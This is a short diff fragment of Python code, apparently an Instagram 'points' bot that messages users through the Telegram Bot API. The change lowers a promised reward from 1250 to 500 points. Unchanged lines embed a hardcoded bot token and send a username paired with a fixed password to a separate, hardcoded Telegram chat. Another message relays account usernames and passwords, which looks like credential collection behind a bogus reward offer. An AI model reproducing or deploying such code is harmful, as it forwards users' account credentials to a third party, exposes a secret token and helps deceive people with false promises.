@@ -72,7 +72,7 @@ def checker():
              print('')
             else:
              print('')
-             req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= ستتم اضافة 1250 نقطةالنقاط خلال 1-24 ساعة للتأكد من عدم سحب الحساب' )
+             req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= ستتم اضافة 500 نقطة خلال 1-24 ساعة للتأكد من عدم سحب الحساب' )
             req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text={Username}:mahdy@282' )
             req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= تم تسجيل حساب جديد \n ايدي الشخص : {id} \n يوزر الوهمي : {Username} \n باسوورد الوهمي : {Password}\nيوزره انستا : {Youruser}')               
         else:
